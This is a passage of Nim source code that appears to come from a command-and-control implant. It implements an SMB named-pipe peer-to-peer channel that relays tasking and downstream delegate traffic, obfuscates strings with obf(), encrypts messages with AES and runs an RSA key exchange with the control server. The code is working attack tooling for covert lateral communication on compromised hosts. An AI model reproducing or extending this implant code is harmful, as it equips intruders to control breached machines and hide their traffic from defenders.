                      debug "[DEBUG] SMB P2P: Including ", taskDelegates.len, " downstream delegate(s) with task response"
                    
                    debug "[DEBUG] SMB P2P: Sending ", taskResponses.len, " task response(s)"
                    let responseEncrypted = profile.encryptMessage($taskingResponse, profile.callbackUuid)
                    discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
                    
                    if shouldExit:
                      debug "[DEBUG] SMB P2P: Exit command sent, waiting for delivery before shutdown"
                      sleep(500)
                      clientShouldExit = true
                      break
                else:
                  debug "[DEBUG] SMB P2P: No tasks in get_tasking response"
                  # Even without tasks, check for downstream delegate data to relay
                  let (noTaskDelegates, noTaskEdges) = collectDownstreamDelegatesSmb()
                  if noTaskDelegates.len > 0 or noTaskEdges.len > 0:
                    let delegateResponse = %* {
                      obf("action"): obf("post_response"),
                      obf("responses"): noTaskEdges
                    }
                    if noTaskDelegates.len > 0:
                      delegateResponse[obf("delegates")] = noTaskDelegates
                      debug "[DEBUG] SMB P2P: Sending ", noTaskDelegates.len, " downstream delegate(s) (no tasks)"
                    let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
                    discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
                  continue
          except:
            discard
          
        except Exception as e:
          debug "[DEBUG] SMB P2P: Error in client loop: ", e.msg
          break
      
      # Disconnect client
      discard DisconnectNamedPipe(profile.pipeHandle)
      debug "[DEBUG] SMB P2P: Client handler finished"
      
      if clientShouldExit:
        debug "[DEBUG] SMB P2P: Exit command received, shutting down server"
        break
      
      # Close and recreate pipe for next connection
      discard CloseHandle(profile.pipeHandle)
      profile.listening = false
      if not profile.startListening():
        debug "[DEBUG] SMB P2P: Failed to recreate pipe for next connection"
        return
      
    except Exception as e:
      debug "[DEBUG] SMB P2P: Error in accept loop: ", e.msg
      # Try to recreate pipe
      if profile.listening:
        discard CloseHandle(profile.pipeHandle)
        profile.listening = false
      if not profile.startListening():
        return
  
  # Clean shutdown
  if profile.listening:
    discard CloseHandle(profile.pipeHandle)
    profile.listening = false
  debug "[DEBUG] SMB P2P: Server shut down"

proc setAesKey*(profile: var SmbProfile, key: seq[byte]) =
  ## Set the AES encryption key
  profile.aesKey = key

proc setAesDecKey*(profile: var SmbProfile, key: seq[byte]) =
  ## Set the AES decryption key
  profile.aesDecKey = key

proc hasAesKey*(profile: SmbProfile): bool =
  ## Check if AES key is set
  result = profile.aesKey.len > 0

proc performKeyExchange*(profile: var SmbProfile): tuple[success: bool, newUuid: string] =
  ## Perform RSA key exchange to establish AES session key
  ## Returns (success, newUuid) tuple where newUuid is the callback UUID from server
  
  if not profile.config.encryptedExchange:
    debug "[DEBUG] SMB P2P: No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
    return (true, "")
  
  when not encryptedExchange:
    debug "[DEBUG] SMB P2P: RSA not compiled in (ENCRYPTED_EXCHANGE_CHECK not set at build time)"
    return (true, "")
  
  when encryptedExchange:
    var p = profile
    proc sendWrapper(data: string, uuid: string): string =
      return p.send(data, uuid)
    
    let result = performRsaKeyExchange(profile.config, profile.config.uuid, sendWrapper)
    
    if result.success and result.sessionKey.len > 0:
      profile.setAesKey(result.sessionKey)
      return (true, result.newUuid)
    elif result.success:
      return (true, "")
    else:
      debug "[DEBUG] SMB P2P: Key exchange failed: ", result.error
      return (false, "")
